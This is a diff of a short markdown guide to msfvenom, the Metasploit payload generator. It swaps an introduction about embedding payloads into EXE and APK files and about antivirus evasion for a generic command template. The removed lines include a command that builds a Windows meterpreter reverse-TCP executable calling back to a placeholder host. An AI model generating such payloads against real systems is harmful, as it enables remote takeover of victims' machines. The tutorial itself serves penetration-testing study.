@@ -1,23 +1,17 @@
 # Msfvenom Practical Guide
 
-## Introduction
+## Generating Standalone Payloads and Listeners
 
-Msfvenom is a powerful tool within the Metasploit Framework used for generating payloads. This practical guide will walk you through the process of generating standalone payloads and listeners for various platforms, embedding payloads into executable files (exe) and Android applications (APK), and creating fully-undetectable payloads using Shellter or other antivirus evasion techniques.
+Msvenom is a powerful tool in the Metasploit framework used for payload generation. It allows you to create payloads for various platforms.
 
-## Table of Contents
+### Basic Payload Generation
 
-1. [Setting Up Metasploit](#setting-up-metasploit)
-2. [Generating Standalone Payloads](#generating-standalone-payloads)
-3. [Embedding Payloads to Exe and APK](#embedding-payloads)
-4. [Creating Fully-Undetectable Payloads](#fully-undetectable-payloads)
-
-## Setting Up Metasploit
-
-Ensure you have Metasploit installed and configured on your system. If not, refer to the official documentation for installation instructions: [Metasploit Framework Installation](https://metasploit.help.rapid7.com/docs/metasploit-framework-installation)
-
-## Generating Standalone Payloads
-
-Use the following command to generate a basic Windows executable payload:
+To generate a basic payload for a specific platform, use the following command:
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f exe > payload.exe
+msfvenom -p [payload] -f [format] LHOST=[your_IP] LPORT=[port] -o [output_filename]
+```
+Replace [payload] with the desired payload.
+Specify the format with -f (e.g., exe, apk, etc.).
+Set your IP with LHOST and the desired port with LPORT.
+Save the output with -o [output_filename].
